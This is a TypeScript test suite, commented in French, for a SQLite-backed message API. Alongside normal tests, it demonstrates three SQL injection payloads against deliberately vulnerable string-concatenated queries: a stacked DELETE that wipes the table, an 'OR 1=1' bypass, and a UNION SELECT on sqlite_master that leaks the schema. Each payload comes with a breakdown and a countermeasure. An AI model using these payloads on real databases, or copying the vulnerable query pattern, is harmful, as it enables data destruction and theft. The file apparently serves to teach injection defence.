import assert from 'node:assert/strict';
import test from 'node:test';
import {
  createMessageHandler,
  getMessageHandler,
  listMessagesHandler,
} from '../lib/app.js';
import { clearMessages, type Message } from '../lib/database.js';

process.env.SQLITE_DB_PATH = ':memory:';

const noop = () => {};

type MockResponse<T> = {
  statusCode: number;
  jsonPayload: T | undefined;
  status(code: number): MockResponse<T>;
  json(payload: T): MockResponse<T>;
};

type ErrorPayload = { error: string };

test('Gestionnaire POST /messages', async (t) => {
  t.beforeEach(() => {
    clearMessages();
  });

  await t.test('persiste le corps nettoyé et retourne le payload', () => {
    // Test de fonctionnement normal : vérifie que les espaces sont correctement supprimés
    // et que le message est persisté dans la base de données
    const response = invokeCreate('   Message de test   ');

    assert.equal(response.statusCode, 201);
    assert(response.jsonPayload);
    assert.equal(response.jsonPayload?.body, 'Message de test');
    assert.equal(typeof response.jsonPayload?.id, 'number');
  });

  await t.test('rejette les payloads manquants ou vides', () => {
    // Test de validation : vérifie que l'API rejette correctement les corps de message vides
    // Cette validation basique ne protège PAS contre les injections SQL
    const emptyResponse = createMockResponse<ErrorPayload>();
    createMessageHandler(createMockRequest({ body: '' }) as never, emptyResponse as never, noop);
    assert.equal(emptyResponse.statusCode, 400);
    assert.deepEqual(emptyResponse.jsonPayload, { error: 'Le corps du message est requis.' });

    const missingResponse = createMockResponse<ErrorPayload>();
    createMessageHandler(createMockRequest({}) as never, missingResponse as never, noop);
    assert.equal(missingResponse.statusCode, 400);
    assert.deepEqual(missingResponse.jsonPayload, { error: 'Le corps du message est requis.' });
  });

  await t.test('le payload d\'injection efface les messages existants', () => {
    // DÉMONSTRATION D'INJECTION SQL #1 : Suppression de données (DELETE)
    //
    // Ce test illustre comment un attaquant peut exploiter insertMessage() dans database.ts:127
    // qui construit la requête avec : INSERT INTO messages (body) VALUES ('${body}')
    //
    // Payload malveillant : '); DELETE FROM messages; --
    //
    // Requête SQL résultante après concaténation :
    //   INSERT INTO messages (body) VALUES (''); DELETE FROM messages; --')
    //
    // Décomposition :
    //   1. VALUES ('') - Ferme prématurément la chaîne avec ')
    //   2. ; - Termine l'instruction INSERT
    //   3. DELETE FROM messages - Exécute une seconde requête destructrice
    //   4. ; -- - Termine le DELETE et commente le reste avec --
    //
    // Impact : Tous les messages de la table sont supprimés
    // Contre-mesure : Utiliser des requêtes paramétrées au lieu de la concaténation de chaînes
    invokeCreate('Premier message sûr');

    const maliciousBody = `'); DELETE FROM messages; --`;
    const injectionResponse = invokeCreate(maliciousBody);

    assert.equal(injectionResponse.statusCode, 500);

    const listResponse = invokeList();
    assert.equal(listResponse.statusCode, 200);
    assert(Array.isArray(listResponse.jsonPayload));
    assert.equal(listResponse.jsonPayload?.length, 0);
  });
});

test('Gestionnaire GET /messages', async (t) => {
  t.beforeEach(() => {
    clearMessages();
  });

  await t.test('retourne les messages stockés', () => {
    // Test de fonctionnement normal : vérifie que listMessages() retourne correctement
    // les messages existants. Cette fonction utilise des requêtes paramétrées et est SÉCURISÉE
    invokeCreate('Stocké');

    const response = invokeList();

    assert.equal(response.statusCode, 200);
    assert(Array.isArray(response.jsonPayload));
    assert.equal(response.jsonPayload?.length, 1);
    const message = response.jsonPayload?.[0];
    assert.equal(message.body, 'Stocké');
    assert.equal(typeof message.id, 'number');
    assert.equal(typeof message.createdAt, 'string');
  });
});

test('Gestionnaire GET /messages/:id', async (t) => {
  t.beforeEach(() => {
    clearMessages();
  });

  await t.test('retourne la ressource par id', () => {
    // Test de fonctionnement normal : vérifie la récupération d'un message par son ID
    // Lorsque l'ID est un nombre valide, la fonction fonctionne correctement
    const created = invokeCreate('Message cible').jsonPayload;
    const response = invokeGet(String(created?.id ?? ''));

    assert.equal(response.statusCode, 200);
    assert.equal(response.jsonPayload?.id, created?.id);
    assert.equal(response.jsonPayload?.body, 'Message cible');
  });

  await t.test('exécute du SQL brut lorsque l\'id est injecté', () => {
    // DÉMONSTRATION D'INJECTION SQL #2 : Contournement de la condition WHERE (Boolean-based)
    //
    // Ce test exploite findMessageById() dans database.ts:152
    // qui construit la requête avec : WHERE id = ${id}
    //
    // Payload malveillant : 0 OR 1=1
    //
    // Requête SQL résultante après concaténation :
    //   SELECT id, body, created_at FROM messages WHERE id = 0 OR 1=1
    //
    // Décomposition :
    //   1. WHERE id = 0 - Condition toujours fausse (aucun message avec id=0)
    //   2. OR 1=1 - Condition toujours vraie, court-circuite la vérification d'ID
    //
    // Impact : Retourne le premier message disponible au lieu de rejeter la requête invalide
    // Risque : Accès non autorisé à des données, contournement de la logique métier
    // Contre-mesure : Valider strictement que l'ID est numérique ET utiliser des requêtes paramétrées
    invokeCreate('sûr');

    const response = invokeGet('0 OR 1=1');

    assert.equal(response.statusCode, 200);
    assert.equal(response.jsonPayload?.body, 'sûr');
  });

  await t.test('peut divulguer la définition du schéma via un payload UNION', () => {
    // DÉMONSTRATION D'INJECTION SQL #3 : Extraction de métadonnées (UNION-based)
    //
    // Ce test exploite findMessageById() dans database.ts:152 avec une attaque UNION SELECT
    //
    // Payload malveillant :
    //   0 UNION SELECT 1, sql, '1970-01-01T00:00:00' FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1--
    //
    // Requête SQL résultante :
    //   SELECT id, body, created_at FROM messages WHERE id = 0
    //   UNION SELECT 1, sql, '1970-01-01T00:00:00' FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1--
    //
    // Décomposition :
    //   1. WHERE id = 0 - Aucun résultat de la première requête
    //   2. UNION SELECT - Combine avec une seconde requête
    //   3. 1, sql, '1970-01-01T00:00:00' - Aligne les colonnes (id, body, created_at)
    //   4. FROM sqlite_master - Table système SQLite contenant les schémas
    //   5. WHERE type='table' - Filtre pour obtenir les définitions de tables
    //   6. OFFSET 1 - Saute la première table (messages) pour obtenir messages2
    //   7. -- - Commente le reste de la requête
    //
    // Impact : Révèle la structure complète de la base de données (noms de tables, colonnes, types)
    // Risque : Reconnaissance pour des attaques plus ciblées, fuite d'informations sensibles
    // Contre-mesure : Requêtes paramétrées + validation stricte des types d'entrée
    const payload = "0 UNION SELECT 1, sql, '1970-01-01T00:00:00' FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1--";

    const response = invokeGet(payload);

    assert.equal(response.statusCode, 200);
    assert.equal(response.jsonPayload?.body ?? '', "CREATE TABLE messages2 (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        body TEXT NOT NULL,\n        created_at TEXT NOT NULL DEFAULT (datetime('now'))\n      )");
  });
});

function createMockRequest<T extends Record<string, unknown>>(body: T) {
  return {
    method: 'POST',
    body,
    headers: {},
  };
}

function createMockResponse<T = unknown>(): MockResponse<T> {
  const response: MockResponse<T> = {
    statusCode: 200,
    jsonPayload: undefined,
    status(code) {
      response.statusCode = code;
      return response;
    },
    json(payload) {
      response.jsonPayload = payload;
      return response;
    },
  };
  return response;
}

function invokeCreate(body: string): MockResponse<Message> {
  const response = createMockResponse<Message>();
  createMessageHandler(createMockRequest({ body }) as never, response as never, noop);
  return response;
}

function invokeList(): MockResponse<Message[]> {
  const response = createMockResponse<Message[]>();
  listMessagesHandler({} as never, response as never, noop);
  return response;
}

function invokeGet(idParam: string): MockResponse<Message> {
  const response = createMockResponse<Message>();
  getMessageHandler({ params: { id: idParam } } as never, response as never, noop);
  return response;
}
